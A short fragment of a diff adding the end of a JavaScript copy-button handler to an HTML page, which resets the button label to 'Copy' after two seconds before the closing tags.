+    setTimeout(()=>btn.textContent='Copy',2000);
+  });
+}
 </script>
 </body>
 </html>
